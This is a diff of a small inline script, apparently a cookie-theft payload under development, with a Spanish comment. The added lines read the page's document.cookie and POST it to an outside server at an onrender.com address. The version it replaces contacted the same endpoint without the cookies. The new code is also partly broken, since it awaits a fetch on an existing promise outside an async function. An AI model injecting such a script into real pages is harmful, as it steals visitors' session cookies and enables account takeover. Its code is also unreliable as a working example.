@@ -1,20 +1,17 @@
 
 <script>
+    const cookies = document.cookie
+
+    //Enviar cookies al servidor
+    const request= fetch("https://testnode-vo76.onrender.com/cookies",{
+        method: 'POST',
+        body: JSON.stringify({cookies})
+    })
+    .then(data => console.log(data))
+    .catch(error => console.error('Error:', error));
     
-    function obtenerCookies() {
-        const cookies = document.cookie
+    const response = await fetch(request);
+    console.log(response.status)
 
-        //Enviar cookies al servidor
-        fetch("https://testnode-vo76.onrender.com/cookies",{
-            method: 'POST',
-            headers: {
-               'Content-Type': 'application/json', 
-            }
-        })
-        .then(data => console.log(cookies))
-        .catch(error => console.error('Error:', error));
-    }
-
-    obtenerCookies();
 
 </script>
